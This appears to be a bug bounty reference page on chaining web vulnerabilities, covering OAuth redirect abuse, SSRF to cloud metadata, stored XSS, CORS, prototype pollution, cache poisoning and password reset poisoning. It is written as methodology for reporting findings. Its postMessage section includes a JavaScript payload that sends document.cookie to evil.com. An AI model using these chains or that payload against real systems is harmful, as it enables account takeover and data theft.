# Chain Patterns Reference

This is where the money is. A standalone medium = $500-$2k. Two mediums chained into a critical = $5k-$50k.

## Classic Chains

### Open Redirect → OAuth Account Takeover
**Low → Critical**

1. Find open redirect on target (e.g., `/redirect?url=`)
2. Identify OAuth flow using that domain
3. Inject redirect into OAuth `redirect_uri` parameter
4. Victim authorizes → code/token sent to attacker via redirect
5. Attacker exchanges code for access token → full account takeover

**Variant:** Referer header leaks token after redirect to attacker-controlled page.

### SSRF → Cloud Metadata → RCE
**Medium → Critical**

1. Confirm SSRF (even blind/partial)
2. Hit cloud metadata: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
3. Extract IAM credentials (AccessKeyId, SecretAccessKey, Token)
4. Enumerate permissions: `aws sts get-caller-identity`, `aws iam list-attached-role-policies`
5. Escalate: S3 access, Lambda invocation, EC2 control, secrets manager

**Key endpoints:**
- AWS: `169.254.169.254/latest/meta-data/`
- GCP: `metadata.google.internal/computeMetadata/v1/` (Header: `Metadata-Flavor: Google`)
- Azure: `169.254.169.254/metadata/instance?api-version=2021-02-01` (Header: `Metadata: true`)

### XSS → Admin Action → Privilege Escalation
**Medium → Critical**

1. Find stored XSS (profile, comment, support ticket, etc.)
2. Identify where admin/staff views user-submitted content
3. Craft payload that performs admin actions: create admin user, change permissions, extract data
4. Admin views content → payload executes in admin session
5. Attacker gains admin access

**Key:** The XSS location matters less than WHERE it renders. A stored XSS in a support ticket that admins review is worth far more than one in a user-to-user chat.

### IDOR → PII Leak → Account Takeover
**Medium → Critical**

1. Find IDOR (sequential IDs, predictable UUIDs, etc.)
2. Enumerate to access other users' data
3. Extract PII: email, phone, security questions, partial CC, API keys
4. Use PII to: reset password, bypass 2FA, answer security questions, call support for account recovery

### Subdomain Takeover → Cookie Theft
**Medium → High/Critical**

1. Find dangling CNAME (points to deprovisioned service)
2. Claim the subdomain on the cloud provider (Heroku, GitHub Pages, S3, etc.)
3. Host page that reads cookies scoped to `*.domain.com`
4. Any user visiting the subdomain leaks session cookies
5. Use cookies for session hijacking on main domain

**Check for:** Heroku (`*.herokuapp.com`), GitHub Pages, AWS S3, Azure, Shopify, Fastly.

### Race Condition → Financial Impact
**Medium → High**

1. Identify payment, transfer, reward, or coupon redemption flow
2. Send concurrent requests (same timestamp) using multiple threads
3. Backend processes both before checking state → double-spend
4. Demonstrate: $X credited twice, reward redeemed multiple times, etc.

**Tools:** Turbo Intruder, custom Python with `threading`/`asyncio`, Burp Repeater group-send.

### Info Disclosure → Full Exploitation
**Low → Varies**

The finding triagers want to close as informational, until you show what an attacker does with it.

1. Find info disclosure (error messages, debug endpoints, .env files, stack traces)
2. Extract: internal paths, database structure, API keys, version numbers
3. Use to: access internal endpoints, authenticate to services, exploit known CVEs
4. Chain into concrete impact

**Common sources:** verbose error pages, `.git` exposure, `.env` files, `/debug`, `/actuator`, Swagger docs, GraphQL introspection.

## Modern Chains

### OAuth Misconfiguration → Account Takeover (Without Open Redirect)
**Medium → Critical**

When the OAuth server itself is misconfigured — no open redirect needed.

1. Find unauthenticated dynamic client registration (`/register` endpoint open)
2. Register client with `token_endpoint_auth_method: "none"` (no client secret required)
3. Request arbitrary scopes (`admin:execute`, `*`, `openid profile email`)
4. Server accepts and persists scopes without admin approval
5. Construct authorize URL with attacker's client_id → victim clicks → code issued to attacker's redirect_uri
6. Exchange code at `/token` without any client secret (because `none` auth method)
7. Token issued with escalated scopes → account takeover or privilege escalation

**Key signals:** Open `/register`, `/.well-known/oauth-authorization-server` listing `none` in supported auth methods, arbitrary scope acceptance. See RFC 7591, RFC 8252.

**Variant:** Even if redirect_uri is locked to localhost, a malicious native app or local process captures the code (RFC 8252 loopback interface pattern).

### GraphQL Introspection → Auth Bypass → Data Exfil
**Low → Critical**

1. Discover GraphQL endpoint (`/graphql`, `/api/graphql`)
2. Run introspection query: `{__schema{types{name,fields{name,args{name}}}}}`
3. Find admin-only mutations/queries not exposed in the UI
4. Test each without auth or with low-priv auth — many resolvers skip auth checks
5. Extract sensitive data or perform privileged actions via undiscovered queries

**Variant:** Batching attack — send multiple queries in one request to bypass rate limiting on auth checks.

### Cache Poisoning → Stored XSS
**Low → High/Critical**

1. Identify cacheable endpoint (CDN, Varnish, Nginx cache)
2. Find unkeyed header or parameter that affects response (e.g., `X-Forwarded-Host`, `X-Original-URL`)
3. Inject XSS payload via unkeyed input — response gets cached
4. Every subsequent visitor receives the poisoned cached response with XSS payload
5. No user interaction needed beyond visiting the page — it's already poisoned

**Tools:** Param Miner (Burp), manual header fuzzing. Check `Vary`, `Cache-Control`, `Age` headers.

### Prototype Pollution → RCE / XSS
**Low → Critical**

1. Find prototype pollution via `__proto__`, `constructor.prototype`, or deep merge
2. In client-side JS: pollute properties used by template engines or DOM manipulation → XSS
3. In server-side Node.js: pollute `shell`, `env`, `NODE_OPTIONS` properties → RCE via child_process
4. Chain with other gadgets: `ejs` template options, `express` settings, `lodash` merge paths

**Key:** Pollution alone is low/informational. The gadget that turns it into XSS/RCE is the chain.

### CORS Misconfiguration → Data Theft
**Low → High**

1. Test `Origin` header reflection: send `Origin: https://evil.com`, check if `Access-Control-Allow-Origin` reflects it
2. Check if `Access-Control-Allow-Credentials: true` is set
3. If both: any page on attacker's domain can make authenticated requests and read responses
4. Craft page that fetches sensitive data (profile, tokens, PII) and exfiltrates to attacker server
5. Victim visits attacker page → their data is stolen silently

**Variants:** Null origin (`Origin: null` via sandboxed iframe), subdomain trust (`*.target.com` reflected), regex bypass (`targetcom.evil.com` matching `.*target\.com`).

### SSRF → Internal API → Admin Actions
**Medium → Critical**

1. Find SSRF (webhook URL, image fetch, PDF generator, URL preview)
2. Scan internal network: `http://127.0.0.1:<port>`, `http://internal-service/`, common ports (80, 443, 8080, 8443, 9200, 6379, 27017)
3. Find internal admin panel or API without auth (internal services often trust network boundary)
4. Perform admin actions via SSRF: create admin user, read config, access database
5. Chain internal access into external impact

### Mass Assignment → Privilege Escalation
**Medium → High/Critical**

1. Find API endpoint accepting JSON/form body (user update, registration, settings)
2. Add extra fields not in the UI: `{"name": "test", "role": "admin", "is_admin": true}`
3. If backend blindly merges input into model → attacker's role/privilege is elevated
4. Verify by checking profile, accessing admin endpoints, or observing new permissions

**Key fields to try:** `role`, `is_admin`, `admin`, `permissions`, `group`, `plan`, `credits`, `verified`, `email_verified`, `active`.

### CSPT (Client-Side Path Traversal) → Auth Bypass / Data Theft
**Low → High/Critical**

1. Find client-side code that uses user input to construct API paths: `fetch("/api/" + userInput)`
2. Inject path traversal: `../admin/users` or `../internal/config`
3. Client makes request to unintended endpoint — different auth model, different data
4. Extract sensitive data or trigger admin actions through the traversed path

**Variants:**
- Dynamic `import("modules/" + userInput)` → load attacker-controlled JS module → XSS
- Client-side routing manipulation → access admin components without proper role check
- Resource path traversal → load cross-origin resources that leak data

**Key:** CSPT is underexplored because it requires JS analysis to find. Scanners don't catch it. The finding is in the client-side code, but the impact is server-side data access.

### PostMessage DOM XSS → PII Exfiltration
**Medium → Critical**

1. Find a window that listens for `postMessage` events without origin validation
2. Identify what the message handler does — DOM manipulation, navigation, data processing
3. Craft a page that opens the target in an iframe/window and sends a malicious message
4. Message handler processes attacker-controlled data → DOM XSS
5. XSS executes in target context → extract PII, session tokens, perform actions as victim

**Key signals:**
- `window.addEventListener("message", handler)` without `event.origin` check
- Handler that writes `event.data` into DOM (`innerHTML`, `document.write`)
- Handler that navigates based on `event.data` (open redirect, JS execution)
- Handler that passes `event.data` to `eval()`, `Function()`, or template engine

**Testing pattern:**
```javascript
// Attacker page — hosted on evil.com
const target = window.open("https://target.com/vulnerable-page");
setTimeout(() => {
    target.postMessage({
        type: "update",
        content: "<img src=x onerror='fetch(\"https://evil.com/\"+document.cookie)'>"
    }, "*");
}, 2000);
```

### CRLF Injection → Cache Poisoning → Stored XSS
**Low → Critical**

1. Find parameter reflected in response headers (CRLF injection point)
2. Inject `\r\n` to add custom headers to the response
3. Add `Content-Type: text/html` + body with XSS payload via header injection
4. If the response is cached (CDN, reverse proxy) → every subsequent visitor gets the poisoned response
5. Stored XSS without any database — lives in the cache layer

**Variant:** Inject `Set-Cookie` header via CRLF → session fixation → account takeover.

### Header Injection → Password Reset Poisoning
**Low → High**

1. Find password reset flow that uses `Host` header in the reset link
2. Inject `X-Forwarded-Host: attacker.com` or modify `Host` header
3. Reset email sent to victim contains link to `attacker.com/reset?token=xxx`
4. Victim clicks link → token sent to attacker → attacker resets victim's password

**Key:** Works even when XSS is impossible. The injection is in the email, not the page.

## Building Custom Chains

1. Find any vulnerability
2. Map what new position it gives you (what can you now access/do?)
3. Look at what's reachable from that position
4. If you can't escalate now, note it and come back when you find the missing link
5. Two mediums → critical is a career move

### Chain Documentation Template

When reporting a chain, structure it so each step is independently verifiable:

```markdown
## Chain: [Initial Vuln] → [Bridge] → [Final Impact]

### Step 1: [Initial Finding]
[Repro steps for the first vuln in isolation]
[HTTP request/response proving it]

### Step 2: [Bridge / Pivot]
[How the first finding enables the second]
[HTTP request/response showing the pivot]

### Step 3: [Final Impact]
[Full exploit leveraging the chain]
[HTTP request/response proving end-to-end impact]

### Why This Is [Severity]
[Without step 1, step 3 is not possible. The chain converts a [low/medium]
 into a [high/critical] because...]
```

Each step should be copy-pasteable and independently reproducible by the triager.

## Source
https://bugbounty.info/Chains/
